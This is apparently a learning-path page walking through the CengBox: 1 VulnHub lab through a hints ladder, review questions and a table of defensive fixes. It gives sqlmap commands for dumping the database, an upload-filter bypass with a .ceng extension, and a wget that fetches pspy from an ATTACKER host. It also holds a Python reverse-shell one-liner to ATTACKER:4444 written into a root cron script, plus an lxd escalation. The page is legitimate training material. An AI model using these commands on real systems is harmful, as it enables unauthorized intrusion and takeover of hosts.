# Machine 9 — CengBox: 1

> **Position:** 9 of 13 · **Band 3 — Easy** (global rank **018** of 708)
> **Full writeup:** [`labs/3-018-cengbox-1/README.md`](../../labs/3-018-cengbox-1/README.md)

| | |
| --- | --- |
| **Machine** | CengBox: 1 |
| **Author** | Arslan Bilecen (`@arslanblcn_`) |
| **Released** | 30 April 2020 |
| **Target** | Ubuntu — Apache 2.4.x, PHP, MySQL, a **custom PHP admin panel** |
| **VulnHub** | [entry/cengbox-1,475](https://vulnhub.com/entry/cengbox-1,475/) |
| **Goal** | User flag + root flag |
| **Estimated time** | 5–8 hours |

---

## Why this machine is here

This is the path's **hardest web machine**, and it earns that by teaching two things
properly rather than one thing shallowly.

1. **SQL injection as a real technique**, not a magic string. You will use `sqlmap`
   against a login form with `--forms`, and you will watch it work through
   **boolean-blind**, **time-blind** and **UNION** detection in sequence. Then you
   will dump a database that stores the administrator's password **in plaintext**.
2. **Seeing what root is doing.** `ps` only shows processes; **`pspy`** shows
   short-lived processes started by *other users* — including cron jobs that run and
   exit between your keystrokes. That is how you find `/opt/md5check.py`, running as
   root every few seconds and **world-writable**.

It also has a genuinely elegant upload-filter bypass, where the filter checks *only*
the extension and the server is configured to execute a **custom extension** as PHP.

## Learning objectives

1. **Escalate wordlists** and use the **`-X` extension trick** with `dirb`/`gobuster`.
2. Run `sqlmap` against a **POST login form** and read every stage of its output.
3. Explain the difference between **boolean-blind**, **time-blind** and **UNION**
   injection, and why `sqlmap` tries them in that order.
4. Dump a database (`--dbs`, `--tables`, `--dump`, `--dump-all`) and interpret it.
5. Understand why **storing a plaintext password** in a database is worse than a weak
   hash.
6. Bypass an **extension-only upload filter** by finding an extension the server
   already executes.
7. Use **`pspy`** to observe root-owned processes you cannot otherwise see.
8. Exploit a **world-writable script executed by root**, and explain why a "tamper
   detection" script that is itself writable is worse than no script.
9. Know the **`lxd` group** alternative root path.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Content discovery with escalating wordlists | `dirb big.txt` → **`/masteradmin/`**; then `-X .php` → `login.php`, `upload.php`, `adb.php` |
| **SQL injection — boolean-blind** | `login.php`, `username` POST parameter |
| **SQL injection — time-blind** | same |
| **SQL injection — UNION** | same |
| **Plaintext credential storage** | `cengbox.admin.password`, `varchar(64)` |
| **Upload filter bypass (extension allow-list)** | `upload.php` rejects `.php`, demands *"only CENG file allowed"* → **`.ceng`** is executed as PHP |
| Uploads inside the document root | `/var/www/html/uploads/` |
| **Credential reuse** | DB password `C3ng0v3R00T1!` = system password for **`cengover`** |
| **World-writable root cron script** | `/opt/md5check.py`, mode `777`, run as root every few seconds |
| Defeated integrity control | The "tamper detection" script *is* the tampering vector |
| **`lxd` group membership** | `110(lxd)` → alternative root |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§4** (SQL injection in full) and **§5**
  (file upload → web shell), plus §3 for content discovery.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§4** (cron)
  and **§8** (groups — `lxd`).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §5 (reuse).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) §1.

## Before you start — answer these

1. A login form has two POST fields. How do you tell `sqlmap` to test them without
   hand-crafting a request?
2. What is the observable difference between a **boolean-blind** and a
   **time-blind** injection?
3. An upload filter says "only `.ceng` files allowed". What is your *first* question
   about the server's configuration?
4. Why is a plaintext password in a database a worse finding than a fast hash?
5. `ps aux` shows nothing unusual. What tool would show you a root process that runs
   for 200 ms every 5 seconds?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports 22 and 80. The homepage will not tell you much. Run `dirb` with a **large**
wordlist — `common.txt` is not enough here — and look for an administration
directory.

Once you find it, run `dirb` **again inside that directory** with an extension list.
The panel is PHP; the pages are PHP.
</details>

<details>
<summary><strong>Rung 2 — the panel and the injection</strong></summary>

```bash
dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt
# -> /masteradmin/
dirb http://TARGET/masteradmin/ /usr/share/dirb/wordlists/common.txt -X .php
# -> login.php, upload.php, adb.php
```

`login.php` is the injection point. Let `sqlmap` discover the form itself:

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
```

Read the output: it reports which parameter is injectable and which **techniques**
worked. Then:

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --dbs
sqlmap -u "..." --forms --batch -D cengbox --tables
sqlmap -u "..." --forms --batch -D cengbox -T admin --dump
```

The `password` column is **`varchar(64)` plaintext**: `masteradmin : C3ng0v3R00T1!`.
</details>

<details>
<summary><strong>Rung 3 — the upload filter</strong></summary>

Log in to the panel and go to `upload.php`. Uploading `shell.php` is refused with
**"only CENG file allowed"**.

The filter checks **only the extension**. The question is therefore: *what other
extension does this server execute as PHP?* Check the Apache configuration:

```bash
grep -rniE 'AddHandler|AddType|application/x-httpd-php' /etc/apache2/ 2>/dev/null
```

**`.ceng`** is mapped to the PHP handler. So name your shell
**`shell.php.ceng`** (or `shell.ceng` containing PHP) and upload it. It lands in
**`/var/www/html/uploads/`** and executes when requested → RCE as **`www-data`**.
</details>

<details>
<summary><strong>Rung 4 — user flag and the root path</strong></summary>

**User flag:** the DB password is reused. `su cengover` with `C3ng0v3R00T1!` works.

**Root:** `ps aux` shows nothing. Use **`pspy`**, which watches the kernel and
reports processes as they start — including other users':

```bash
wget http://ATTACKER:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

Within seconds you will see **`/opt/md5check.py`** launched as **root**, repeatedly.
Check it:

```bash
ls -l /opt/md5check.py      # -rwxrwxrwx  root root
```

**Mode 777, owned by root, executed by root.** Replace it:

```bash
cp /opt/md5check.py /tmp/bak.py
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /opt/md5check.py
# nc -lvnp 4444  -> root within seconds
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap` → **22**, **80**.
2. `dirb` with **`big.txt`** → **`/masteradmin/`**; `dirb -X .php` inside it →
   **`login.php`**, **`upload.php`**, `adb.php`.
3. **`sqlmap --forms`** on `login.php` → injectable `username` parameter
   (boolean-blind, time-blind, UNION) → database **`cengbox`**, table **`admin`** →
   **`masteradmin : C3ng0v3R00T1!`** (stored **plaintext**, `varchar(64)`).
4. `upload.php` rejects `.php` — *"only CENG file allowed"* → upload
   **`shell.php.ceng`** → stored in **`/var/www/html/uploads/`** and executed as PHP
   → **`www-data`**.
5. **Credential reuse:** `su cengover` with the same password → **user flag**.
6. **`pspy`** reveals **`/opt/md5check.py`** run as root every few seconds; it is
   **mode 777** → overwrite with a reverse shell → **root flag**.
7. **Alternative root:** `cengover` is in the **`lxd`** group →
   `lxc init ubuntu s -c security.privileged=true` → mount host `/` → root.
   Also present but inert: `cengover` appears in `/etc/group`'s `sudo` line with no
   matching `sudoers` rule.
</details>

## After you finish — review questions

1. `sqlmap` reported several injection techniques. Which one did it confirm *first*,
   and why is that order sensible?
2. Explain **boolean-blind** injection in your own words: what is the attacker
   actually observing, and why does it take many requests?
3. Why would you use `--level 3 --risk 2` here rather than the defaults? What are the
   risks of raising them further on a production system?
4. The admin password was stored in plaintext. Is that better or worse than storing
   it as unsalted MD5, from the *defender's* point of view? Explain.
5. Why did `.ceng` execute as PHP? What does that tell you about where the real
   vulnerability was — the upload filter or the web server configuration?
6. What does `pspy` do that `ps` cannot? Why is that difference essential for finding
   short-lived cron jobs?
7. The script was named `md5check.py` — an *integrity* control. Why did it fail as
   one, and what would a real integrity control look like?
8. You had two independent root paths. Which is the "correct" one to report, and how
   do you report the other?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Guessable `/masteradmin/` directory | Directory obscurity is not a control. Authenticate it, and place it behind a VPN or IP allow-list |
| **SQL injection in `login.php`** | **Parameterised queries / prepared statements.** Never concatenate input into SQL. Add a WAF rule as a stopgap only |
| **Admin password stored in plaintext** | Hash with bcrypt/argon2 + per-user salt. A plaintext password column is a reportable incident even without a breach |
| Extension-only upload filter | Validate **content** (magic bytes), store uploads **outside the document root**, and serve them with a `Content-Disposition: attachment` header and a non-executing handler |
| `.ceng` mapped to the PHP handler | Remove unnecessary `AddHandler`/`AddType` mappings. Every extra executable extension is an upload-bypass vector |
| Uploads inside `/var/www/html/uploads/` | Move to a non-executing location; set `php_admin_flag engine off` for that directory |
| DB password reused as a system password | Unique credentials per system; use a secrets manager |
| **`/opt/md5check.py` mode 777, run by root** | `chmod 700`, owner `root`. Never let a root-executed script be writable by anyone else |
| A "tamper detection" script that is itself writable | Integrity controls must be **immutable to the thing they protect** — use AIDE/Tripwire with the database stored read-only or off-host |
| `lxd` group for an ordinary user | Remove the membership. `lxd` (like `docker`) is root-equivalent |
| `gcc` on a server | Remove build tooling from production images |

**The single biggest lesson:** *a control that can be modified by the thing it
controls is not a control.* That is true of `md5check.py`, of an extension-only upload
filter, and of a plaintext password column.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 8 — Empire: Breakout](08-empire-breakout.md) · next: [Machine 10 — PwnLab: init](10-pwnlab-init.md) · full writeup: [`labs/3-018-cengbox-1`](../../labs/3-018-cengbox-1/README.md)._
